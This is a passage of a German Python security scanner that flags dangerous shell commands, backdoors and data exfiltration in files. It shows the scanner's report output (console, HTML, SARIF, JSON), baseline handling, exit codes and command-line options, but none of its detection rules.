                raise ValueError("danach muss ein Objekt {Gruppe: Muster} sein")
            r = Regel(rid, stufe, str(e.get("kategorie", "Eigene")), str(e["titel"]), str(e["muster"]),
                      None, e.get("gruppe"), tuple(e.get("worte", ())),
                      tuple(e.get("beispiele", ())), tuple(e.get("gegenbeispiele", ())), danach)
        except KeyError as k:
            raise ValueError(f"Regel {rid}: Feld {k} fehlt")
        except re.error as x:
            raise ValueError(f"Regel {rid}: ungültiges Muster ({x})")
        except ValueError as x:
            raise ValueError(f"Regel {rid}: {x}")
        if not r.bsp:
            raise ValueError(f"Regel {rid}: mindestens ein Eintrag in 'beispiele' nötig")
        fehler = pruefe_beispiele(r)
        if fehler:
            raise ValueError(f"Regel {rid}: " + "; ".join(fehler))
        neu[rid] = r
    return list(neu.values())


def regeln_als_json(regeln: List[Regel]) -> str:
    def eintrag(r: Regel) -> dict:
        e = {"id": r.id, "stufe": STUFEN_NAME[r.stufe], "kategorie": r.kategorie, "titel": r.titel,
             "gruppe": r.gruppe, "muster": r.muster}
        if r.danach:
            e["danach"] = dict(r.danach)
        e.update({"worte": list(r.worte),
                  "zusatzpruefung": r.pruefung.__name__ if r.pruefung and not r.danach else None,
                  "beispiele": list(r.bsp), "gegenbeispiele": list(r.nicht)})
        return e
    return json.dumps({"version": VERSION, "regeln": [eintrag(r) for r in regeln]},
                      ensure_ascii=False, indent=2)


# --------------------------------------------------------------------------
# Ausgabe
# --------------------------------------------------------------------------

class Farbe:
    def __init__(self, an: bool):
        self.an = an

    def _c(self, code, s):
        return f"\033[{code}m{s}\033[0m" if self.an else s

    def stufe(self, stufe: int, s: str) -> str:
        return self._c({ROT: "1;31", GELB: "1;33", GRUEN: "1;32"}[stufe], s)

    def grau(self, s):
        return self._c("2", s)

    def fett(self, s):
        return self._c("1", s)


def ampel_label(stufe: int, f: Farbe) -> str:
    return f.stufe(stufe, f"● {STUFEN_NAME[stufe]:<4}")


def hinweise(t: Treffer) -> List[str]:
    h = []
    if t.herkunft:
        h.append(HERKUNFT_TEXT[t.herkunft])
    if t.kontext:
        h.append(f"{KONTEXT_TEXT[t.kontext]}, Regelstufe {STUFEN_NAME[t.regel.stufe]}")
    return h


def _zeilenliste(nrs: List[int], hoechstens: int = 8) -> str:
    teil = ", ".join(str(n) for n in nrs[:hoechstens])
    return teil + (f" (+{len(nrs) - hoechstens})" if len(nrs) > hoechstens else "")


def variable_text(t: Treffer, hoechstens: int = 8) -> List[str]:
    """Zeilen für die Ausgabe: geprüfte und offene Verwendungen einer VAR-CMD-Variable."""
    v = t.variable
    if not v:
        return []
    namen = ", ".join("$" + n for n in v["namen"])
    g = v["geprueft"]
    if not v["offen"]:
        return [f"{namen}: {len(g)} Verwendung(en), alle aufgelöst und geprüft: "
                f"Z. {_zeilenliste(g, hoechstens)}"]
    aus = []
    for o in v["offen"][:hoechstens]:
        wo = f"Z. {o['zeile']}: " if o["zeile"] else ""
        wer = f"${o['name']} " if o.get("name") and len(v["namen"]) > 1 else ""
        aus.append(f"nicht prüfbar: {wo}{wer}{o['grund']}")
    if len(v["offen"]) > hoechstens:
        aus.append(f"... und {len(v['offen']) - hoechstens} weitere")
    if g:
        aus.append(f"mit dem zuletzt bekannten Wert geprüft: Z. {_zeilenliste(g, hoechstens)}")
    return aus


def pruefaufwand(e: Ergebnis) -> dict:
    """Wie viele Stellen (Zeilen) von Hand zu prüfen sind, und welcher Art."""
    nach_zeile: Dict[int, List[Treffer]] = {}
    for t in e.treffer:
        nach_zeile.setdefault(t.zeile, []).append(t)
    return {"stellen": len(nach_zeile),
            "nur_erwaehnt": sum(1 for ts in nach_zeile.values() if all(t.kontext for t in ts)),
            "nach_aufloesen": sum(1 for ts in nach_zeile.values() if any(t.herkunft for t in ts)),
            "hinweise": len(e.hinweis)}


def pruefaufwand_text(a: dict) -> str:
    if not a["stellen"]:
        teil = "keine Stelle von Hand prüfen"
    else:
        teil = f"{a['stellen']} {'Stelle' if a['stellen'] == 1 else 'Stellen'} von Hand prüfen"
        davon = []
        if a["nur_erwaehnt"]:
            davon.append(f"{a['nur_erwaehnt']} nur erwähnt")
        if a["nach_aufloesen"]:
            davon.append(f"{a['nach_aufloesen']} erst nach Auflösen erkennbar")
        if davon:
            teil += f" (davon {', '.join(davon)})"
    if a["hinweise"]:
        teil += f", {a['hinweise']} {'Hinweis' if a['hinweise'] == 1 else 'Hinweise'}"
    return "Prüfaufwand: " + teil


def _reihenfolge(e: Ergebnis):
    return (-e.ampel, -e.anzahl(ROT), -e.anzahl(GELB), e.pfad)


def konsole(ergebnisse: List[Ergebnis], fehler: List[str], kurz: bool, f: Farbe):
    gesamt = max((e.ampel for e in ergebnisse), default=GRUEN)
    breite = max([len(e.pfad) for e in ergebnisse] + [5])
    breite = min(breite, 70)

    print(f.fett("\n=== Gefahren-Check: Übersicht ===\n"))
    print(f"  {'Ampel':<7} {'Datei':<{breite}}  {'Rot':>4} {'Gelb':>5}")
    print("  " + "-" * (breite + 20))
    for e in sorted(ergebnisse, key=_reihenfolge):
        name = e.pfad if len(e.pfad) <= breite else "…" + e.pfad[-(breite - 1):]
        zusatz = f.grau(f"  ({e.fehler})") if e.fehler else ""
        print(f"  {ampel_label(e.ampel, f)} {name:<{breite}}  "
              f"{e.anzahl(ROT):>4} {e.anzahl(GELB):>5}{zusatz}")

    if not kurz:
        for e in sorted(ergebnisse, key=_reihenfolge):
            if not e.treffer and not e.erlaubt and not e.hinweis:
                continue
            print(f.fett(f"\n--- {e.pfad} ---"))
            print(f.grau(f"  {pruefaufwand_text(pruefaufwand(e))}"))
            for t in e.treffer:
                text = t.text if len(t.text) <= 150 else t.text[:147] + "..."
                h = hinweise(t)
                print(f"  {ampel_label(t.stufe, f)} Z. {t.zeile:<5} "
                      f"[{t.regel.id}] {t.regel.titel}{' - ' + '; '.join(h) if h else ''}")
                print(f.grau(f"{'':>20}{text}"))
                if t.herkunft in ("aufgelöst", "base64"):
                    print(f.grau(f"{'':>20}→ {t.detail[:130]}"))
                for zeile in variable_text(t):
                    print(f.grau(f"{'':>20}⤷ {zeile}"))
            for t in e.hinweis:
                print(f.grau(f"  ○ HINWEIS Z. {t.zeile:<5} [{t.regel.id}] {t.text[:110]}"))
                for zeile in variable_text(t):
                    print(f.grau(f"{'':>20}⤷ {zeile}"))
            for t in e.erlaubt:
                print(f.grau(f"  ○ erlaubt Z. {t.zeile:<5} [{t.regel.id}] {t.regel.titel} "
                             f"(Kommentar gefahrencheck: erlaubt)"))

    for fe in fehler:
        print(f.stufe(GELB, f"\n  Hinweis: {fe}"))

    n_bekannt = sum(e.bekannt for e in ergebnisse)
    if n_bekannt:
        print(f.grau(f"\n  {n_bekannt} bekannte Treffer ausgeblendet (--basis)"))
    n_erlaubt = sum(len(e.erlaubt) for e in ergebnisse)
    if n_erlaubt:
        print(f.grau(f"\n  {n_erlaubt} Treffer per Kommentar erlaubt (--ausnahmen-zulassen)"))

    stellen = sum(pruefaufwand(e)["stellen"] for e in ergebnisse)
    n_hinweis = sum(len(e.hinweis) for e in ergebnisse)
    if len(ergebnisse) > 1 and (stellen or n_hinweis):
        print(f"\n  Prüfaufwand gesamt: {stellen} {'Stelle' if stellen == 1 else 'Stellen'} "
              f"von Hand prüfen" + (f", {n_hinweis} Hinweis(e)" if n_hinweis else ""))

    n_rot = sum(1 for e in ergebnisse if e.ampel == ROT)
    n_gelb = sum(1 for e in ergebnisse if e.ampel == GELB)
    n_gruen = sum(1 for e in ergebnisse if e.ampel == GRUEN)
    print(f"\n  {len(ergebnisse)} Datei(en) geprüft: "
          f"{f.stufe(ROT, str(n_rot) + ' rot')}, "
          f"{f.stufe(GELB, str(n_gelb) + ' gelb')}, "
          f"{f.stufe(GRUEN, str(n_gruen) + ' grün')}")
    print(f"  Gesamtbewertung: {ampel_label(gesamt, f)}\n")


def html_bericht(ergebnisse: List[Ergebnis], pfad: str):
    farben = {ROT: "#d93025", GELB: "#f9ab00", GRUEN: "#1e8e3e"}
    gesamt = max((e.ampel for e in ergebnisse), default=GRUEN)
    zeilen_, details = [], []
    for e in sorted(ergebnisse, key=_reihenfolge):
        dot = f'<span class="dot" style="background:{farben[e.ampel]}"></span>'
        zeilen_.append(
            f"<tr><td>{dot}{STUFEN_NAME[e.ampel]}</td><td><code>{html.escape(e.pfad)}"
            f"</code>{' <em>(' + html.escape(e.fehler) + ')</em>' if e.fehler else ''}</td>"
            f"<td class=n>{e.anzahl(ROT)}</td><td class=n>{e.anzahl(GELB)}</td>"
            f"<td class=n>{pruefaufwand(e)['stellen']}</td></tr>")
        if e.treffer or e.hinweis:
            items = "".join(
                f'<tr><td><span class="dot" style="background:{farben[t.stufe]}">'
                f"</span>{STUFEN_NAME[t.stufe]}</td><td class=n>{t.zeile}</td>"
                f"<td><b>{html.escape(t.regel.id)}</b><br>{html.escape(t.regel.titel)}"
                + "".join(f"<br><em>{html.escape(h)}</em>" for h in hinweise(t)) +
                f"</td><td><code>{html.escape(t.text[:300])}</code>"
                + (f"<br>→ <code>{html.escape(t.detail[:200])}</code>"
                   if t.herkunft in ("aufgelöst", "base64") else "")
                + "".join(f"<br>⤷ {html.escape(z)}" for z in variable_text(t, 30)) +
                "</td></tr>"
                for t in e.treffer)
            items += "".join(
                f'<tr class="hinweis"><td><span class="dot" style="background:#9aa0a6"></span>'
                f"HINWEIS</td><td class=n>{t.zeile}</td><td><b>{html.escape(t.regel.id)}</b><br>"
                f"{html.escape(t.regel.titel)}</td><td><code>{html.escape(t.text[:300])}</code>"
                + "".join(f"<br>⤷ {html.escape(z)}" for z in variable_text(t, 30)) +
                "</td></tr>"
                for t in e.hinweis)
            details.append(f"<h3><code>{html.escape(e.pfad)}</code></h3>"
                           f"<p>{html.escape(pruefaufwand_text(pruefaufwand(e)))}</p>"
                           f"<table><tr><th>Stufe</th><th>Zeile</th><th>Regel</th>"
                           f"<th>Fundstelle</th></tr>{items}</table>")
    doc = f"""<!DOCTYPE html><html lang="de"><head><meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'">
<title>Gefahren-Check</title><style>
body{{font-family:system-ui,sans-serif;margin:2rem;color:#202124}}
table{{border-collapse:collapse;width:100%;margin-bottom:1.5rem}}
th,td{{border-bottom:1px solid #ddd;padding:.4rem .6rem;text-align:left;vertical-align:top}}
th{{background:#f1f3f4}} td.n{{text-align:right}} tr.hinweis{{color:#5f6368}}
code{{font-size:.9em;word-break:break-all}}
.dot{{display:inline-block;width:.9em;height:.9em;border-radius:50%;margin-right:.4em;vertical-align:-.1em}}
.gesamt{{font-size:1.3rem;padding:.6rem 1rem;border-radius:6px;color:#fff;
background:{farben[gesamt]};display:inline-block}}
</style></head><body>
<h1>Gefahren-Check</h1>
<p>Erstellt: {datetime.now():%d.%m.%Y %H:%M} &middot; {len(ergebnisse)} Datei(en) &middot; Version {VERSION}</p>
<p class="gesamt">Gesamtbewertung: {STUFEN_NAME[gesamt]}</p>
<h2>Übersicht</h2>
<table><tr><th>Ampel</th><th>Datei</th><th>Rot</th><th>Gelb</th><th>Stellen</th></tr>{''.join(zeilen_)}</table>
<h2>Details</h2>{''.join(details) or '<p>Keine Treffer.</p>'}
<p><small>Mustersuche mit einfacher Syntaxanalyse - verschleierte Befehle werden nicht
zuverlässig erkannt. GRÜN bedeutet „nichts Bekanntes gefunden“, nicht „sicher“.
HINWEISE beeinflussen die Ampel nicht. „Stellen“ = Zeilen, die von Hand zu prüfen sind.</small></p>
</body></html>"""
    with open(pfad, "w", encoding="utf-8") as fh:
        fh.write(doc)


def sarif_bericht(ergebnisse: List[Ergebnis], regeln: List[Regel], pfad: str):
    """SARIF 2.1.0 für Code-Scanning-Oberflächen (GitHub, GitLab, VS Code)."""
    stufe_level = {ROT: "error", GELB: "warning"}
    ergebnisse_sarif = []
    for e in ergebnisse:
        uri = e.pfad.replace(os.sep, "/")
        if uri.startswith("./"):
            uri = uri[2:]
        for t, level in [(t, stufe_level[t.stufe]) for t in e.treffer] + [(t, "note") for t in e.hinweis]:
            nachricht = t.regel.titel + "".join(f" ({h})" for h in hinweise(t) + variable_text(t, 30))
            ergebnisse_sarif.append({
                "ruleId": t.regel.id, "level": level,
                "message": {"text": nachricht},
                "locations": [{"physicalLocation": {"artifactLocation": {"uri": uri},
                                                    "region": {"startLine": t.zeile}}}],
                "partialFingerprints": {"gefahrencheck/v1": schluessel(e.pfad, t)},
            })
    doc = {
        "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
        "version": "2.1.0",
        "runs": [{
            "tool": {"driver": {
                "name": "gefahrencheck", "version": VERSION,
                "rules": [{"id": r.id, "name": r.id, "shortDescription": {"text": r.titel},
                           "defaultConfiguration": {"level": stufe_level[r.stufe]},
                           "properties": {"category": r.kategorie}} for r in regeln],
            }},
            "results": ergebnisse_sarif,
        }],
    }
    with open(pfad, "w", encoding="utf-8") as fh:
        json.dump(doc, fh, ensure_ascii=False, indent=2)


def regeln_ausgeben(regeln: List[Regel], f: Farbe):
    print(f.fett(f"\nRegelkatalog ({len(regeln)} Regeln)\n"))
    kat = None
    for r in sorted(regeln, key=lambda r: (r.kategorie, -r.stufe, r.id)):
        if r.kategorie != kat:
            kat = r.kategorie
            print(f.fett(f"\n[{kat}]"))
        print(f"  {ampel_label(r.stufe, f)} {r.id:<15} {r.titel}")
    print()


# --------------------------------------------------------------------------

def schluessel(pfad: str, t: Treffer) -> str:
    """Kennung eines Treffers für die Basisdatei: Dateiname, Regel, Zeileninhalt.
    Zeilennummer und Verzeichnis gehen nicht ein, damit Verschieben nichts ändert."""
    h = hashlib.sha256(t.text.encode("utf-8", "replace")).hexdigest()[:16]
    return f"{os.path.basename(pfad)}:{t.regel.id}:{h}"


def lade_basis(datei: str) -> set:
    with open(datei, encoding="utf-8") as fh:
        return {z.split()[0] for z in fh if z.strip() and not z.startswith("#")}


def schreibe_basis(ergebnisse: List[Ergebnis], datei: str) -> int:
    zeilen_ = sorted({f"{schluessel(e.pfad, t)}  # {STUFEN_NAME[t.stufe]} {t.text[:80]}"
                      for e in ergebnisse for t in e.treffer})
    with open(datei, "w", encoding="utf-8") as fh:
        fh.write("# Basis für gefahrencheck.py --basis: bekannte, geprüfte Treffer.\n"
                 "# Format: <dateiname>:<regel>:<prüfsumme der zeile>  # kommentar\n")
        fh.write("\n".join(zeilen_) + ("\n" if zeilen_ else ""))
    return len(zeilen_)


def _treffer_json(t: Treffer) -> dict:
    return {"zeile": t.zeile, "stufe": STUFEN_NAME[t.stufe],
            "regelstufe": STUFEN_NAME[t.regel.stufe], "regel": t.regel.id,
            "kategorie": t.regel.kategorie, "titel": t.regel.titel, "text": t.text,
            "verschleiert": t.entschleiert, "herkunft": t.herkunft or None,
            "kontext": t.kontext or None, "aufgeloest": t.detail or None,
            "variable": t.variable}


def exit_code(ergebnisse: List[Ergebnis], fehler: List[str]) -> int:
    """0 grün, 1 gelb, 2 rot, 3 nicht (vollständig) geprüft."""
    if not ergebnisse and fehler:
        return 3
    if any(e.abgebrochen for e in ergebnisse):
        # Ein Rest blieb ungeprüft. Nur ROT steht damit fest. GELB darf dann nicht
        # gemeldet werden, sonst ließe sich der Git-Hook (er lässt GELB passieren) mit
        # einer gelben Fundstelle und einer absichtlich langsamen Zeile umgehen.
        return ROT if any(e.ampel == ROT for e in ergebnisse) else 3
    if any(e.fehler for e in ergebnisse) and all(e.ampel == GRUEN for e in ergebnisse):
        return 3  # nichts gefunden, aber auch nicht alles gelesen: nicht als GRÜN melden
    return max((e.ampel for e in ergebnisse), default=GRUEN)


def als_json(ergebnisse: List[Ergebnis], fehler: List[str]) -> str:
    gesamt = max((e.ampel for e in ergebnisse), default=GRUEN)
    return json.dumps({
        "version": VERSION,
        "gesamt": STUFEN_NAME[gesamt],
        "exit": exit_code(ergebnisse, fehler),
        "hinweise": fehler,
        "dateien": [{
            "pfad": e.pfad, "typ": e.typ or None, "ampel": STUFEN_NAME[e.ampel], "fehler": e.fehler,
            "abgebrochen": e.abgebrochen, "bekannt_ausgeblendet": e.bekannt,
            "pruefaufwand": pruefaufwand(e),
            "treffer": [_treffer_json(t) for t in e.treffer],
            "hinweis": [_treffer_json(t) for t in e.hinweis],
            "erlaubt": [_treffer_json(t) for t in e.erlaubt],
        } for e in sorted(ergebnisse, key=_reihenfolge)],
    }, ensure_ascii=False, indent=2)


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Sucht in Dateien/Ordnern nach destruktiven Befehlen, Hintertüren und "
                    "Datenabfluss und zeigt eine Ampel-Übersicht.")
    ap.add_argument("pfade", nargs="*",
                    help="Dateien und/oder Ordner (rekursiv); '-' liest von der Standardeingabe")
    ap.add_argument("--befehl", metavar="TEXT", action="append", default=[],
                    help="einzelnen Befehl prüfen statt einer Datei (mehrfach möglich)")
    ap.add_argument("--typ", choices=TYPEN, default="auto",
                    help="Dateityp erzwingen (Standard: nach Endung/Shebang; Befehle und "
                         "Standardeingabe: shell)")
    ap.add_argument("--html", metavar="DATEI", help="zusätzlich HTML-Bericht schreiben")
    ap.add_argument("--sarif", metavar="DATEI", help="zusätzlich SARIF-2.1.0-Bericht schreiben")
    ap.add_argument("--json", action="store_true",
                    help="Ergebnis als JSON ausgeben (für die Auswertung durch Programme)")
    ap.add_argument("--kurz", action="store_true", help="nur Übersicht, keine Fundstellen")
    ap.add_argument("--ohne-kommentare", action="store_true",
                    help="Kommentare (# ...) nicht prüfen")
    ap.add_argument("--ohne-kontext", action="store_true",
                    help="nicht abstufen: auch nur erwähnte Befehle mit voller Stufe melden")
    ap.add_argument("--ausnahmen-zulassen", action="store_true",
                    help="Kommentare 'gefahrencheck: erlaubt REGEL' beachten (nur für eigene, "
                         "vertrauenswürdige Dateien - ein Angreifer könnte sie sonst selbst setzen)")
    ap.add_argument("--ausschliessen", metavar="MUSTER", action="append",
                    default=[".git", "node_modules", "__pycache__"],
                    help="Datei-/Ordnernamen ausschließen (Wildcards, mehrfach möglich)")
    ap.add_argument("--basis", metavar="DATEI",
                    help="bekannte Treffer aus dieser Datei ausblenden; nur Neues zählt")
    ap.add_argument("--basis-schreiben", metavar="DATEI",
                    help="alle aktuellen Treffer als bekannt in diese Datei schreiben")
    ap.add_argument("--regeldatei", metavar="DATEI", action="append", default=[],
                    help="eigene Regeln aus JSON-Datei laden (mehrfach möglich)")
    ap.add_argument("--ohne-regel", metavar="ID", action="append", default=[],
                    help="Regel abschalten (mehrfach möglich)")
    ap.add_argument("--max-mb", type=float, default=20, help="maximale Dateigröße (Standard 20)")
    ap.add_argument("--zeitlimit", type=float, default=60, metavar="SEK",
                    help="höchstens so lange je Datei oder Befehl prüfen, danach abbrechen und "
                         "Exit 3 (oder 2 bei ROT); 0 = unbegrenzt (Standard 60)")
    ap.add_argument("--keine-farbe", action="store_true", help="ANSI-Farben abschalten")
    ap.add_argument("--regeln", action="store_true",
                    help="Regelkatalog anzeigen und beenden (mit --json als Datei-Vorlage)")
    ap.add_argument("--selbsttest", action="store_true",
                    help="Beispiele aller Regeln prüfen und beenden")
    ap.add_argument("--version", action="version", version=f"gefahrencheck {VERSION}")
    args = ap.parse_args()

    f = Farbe(sys.stdout.isatty() and not args.keine_farbe
              and os.environ.get("NO_COLOR") is None)

    regeln = list(REGELN)
    try:
        for datei in args.regeldatei:
            regeln = lade_regeldatei(datei, regeln)
    except (OSError, ValueError) as e:
        print(f"Regeldatei fehlerhaft: {e}", file=sys.stderr)
        return 3
    unbekannt = [i for i in args.ohne_regel if i not in {r.id for r in regeln}]
    if unbekannt:
        print(f"Unbekannte Regel: {', '.join(unbekannt)}", file=sys.stderr)
        return 3
    regeln = [r for r in regeln if r.id not in args.ohne_regel]

    if args.selbsttest:
        meldungen = selbsttest(regeln)
        for m in meldungen:
            print(f"  FEHLER  {m}")
        n = sum(len(r.bsp) + len(r.nicht) for r in regeln)
        print(f"Selbsttest: {len(regeln)} Regeln, {n} Beispiele - "
              f"{'in Ordnung' if not meldungen else str(len(meldungen)) + ' Fehler'}")
        return 0 if not meldungen else 3
    if args.regeln:
        if args.json:
            print(regeln_als_json(regeln))
        else:
            regeln_ausgeben(regeln, f)
        return 0
    if not args.pfade and not args.befehl:
        ap.print_usage()
        return 3

    if not args.zeitlimit >= 0:  # auch NaN abweisen
        print("--zeitlimit muss eine Zahl ab 0 sein", file=sys.stderr)
        return 3
    typ = None if args.typ == "auto" else args.typ
    zeitlimit = args.zeitlimit or None
    opt = Optionen(args.ohne_kommentare, not args.ohne_kontext, args.ausnahmen_zulassen,
                   typ, regeln, zeitlimit)
    opt_text = Optionen(args.ohne_kommentare, not args.ohne_kontext, args.ausnahmen_zulassen,
                        typ or "shell", regeln, zeitlimit)
    ergebnisse, fehler = [], []
    max_bytes = int(args.max_mb * 1024 * 1024)
    for nr, text in enumerate(args.befehl, 1):
        ergebnisse.append(pruefe_text(f"<befehl {nr}>", text, opt_text))
    dateipfade = [p for p in args.pfade if p != "-"]
    if "-" in args.pfade:
        daten = sys.stdin.buffer.read(max_bytes + 1)
        if len(daten) > max_bytes:
            ergebnisse.append(Ergebnis("<stdin>", fehler="übersprungen (zu groß)"))
        else:
            ergebnisse.append(pruefe_text("<stdin>", daten.decode("utf-8", errors="replace"), opt_text))
    for eintrag in sammle_dateien(dateipfade, args.ausschliessen):
        if isinstance(eintrag, tuple):
            fehler.append(f"Pfad nicht gefunden: {eintrag[1]}")
            continue
        e = scanne_datei(eintrag, max_bytes, opt)
        if e is not None:
            ergebnisse.append(e)

    if args.basis_schreiben:
        try:
            n = schreibe_basis(ergebnisse, args.basis_schreiben)
        except OSError as e:
            print(f"Basis nicht schreibbar: {e.strerror}", file=sys.stderr)
            return 3
        fehler.append(f"{n} Treffer als bekannt nach {args.basis_schreiben} geschrieben")
    if args.basis:
        try:
            bekannt = lade_basis(args.basis)
        except OSError as e:
            print(f"Basis nicht lesbar: {e.strerror}", file=sys.stderr)
            return 3
        for e in ergebnisse:
            neu = [t for t in e.treffer if schluessel(e.pfad, t) not in bekannt]
            e.bekannt = len(e.treffer) - len(neu)
            e.treffer = neu

    if args.json:
        print(als_json(ergebnisse, fehler))
    else:
        konsole(ergebnisse, fehler, args.kurz, f)
    if args.html:
        html_bericht(ergebnisse, args.html)
        if not args.json:
            print(f"  HTML-Bericht: {args.html}\n")
    if args.sarif:
        sarif_bericht(ergebnisse, regeln, args.sarif)
        if not args.json:
            print(f"  SARIF-Bericht: {args.sarif}\n")

    return exit_code(ergebnisse, fehler)


if __name__ == "__main__":
    sys.exit(main())
